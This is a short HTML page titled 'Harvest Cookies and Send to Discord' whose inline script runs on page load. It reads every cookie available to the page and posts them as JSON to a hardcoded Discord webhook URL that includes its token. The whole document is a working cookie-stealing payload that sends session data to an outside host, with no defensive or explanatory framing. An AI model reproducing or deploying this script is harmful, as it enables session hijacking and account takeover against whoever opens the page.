<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Harvest Cookies and Send to Discord</title>
</head>
<body>
    <h1>Harvesting Cookies and Sending to Discord</h1>

    <script>
        async function harvestCookiesAndSendToDiscord() {
            // Function to get cookies from document.cookie
            function getCookies() {
                return document.cookie.split(';').reduce((acc, cookie) => {
                    const [key, value] = cookie.trim().split('=');
                    acc[key] = decodeURIComponent(value);
                    return acc;
                }, {});
            }

            // Get the cookies
            const cookies = getCookies();
            const cookieData = JSON.stringify(cookies);

            // Discord webhook URL (replace with your actual webhook URL)
            const discordWebhookUrl = "https://discord.com/api/webhooks/1397325815477309512/JUn3G3inXFxIb50VYeA8WU2zOp2G39vQEyTb2mFBRpd7NAbPQMEhOk8v6ROydupstQVa";

            try {
                const response = await fetch(discordWebhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        content: `Cookie Data:\n\`\`\`\n${cookieData}\n\`\`\``
                    })
                });

                if (response.ok) {
                    alert('Cookies sent successfully to Discord webhook!');
                } else {
                    alert('Failed to send cookies to Discord webhook.');
                }
            } catch (error) {
                console.error('Error sending cookies:', error);
                alert('An error occurred while sending the cookies.');
            }
        }

        // Call the function when the page loads
        window.onload = harvestCookiesAndSendToDiscord;
    </script>
</body>
</html>
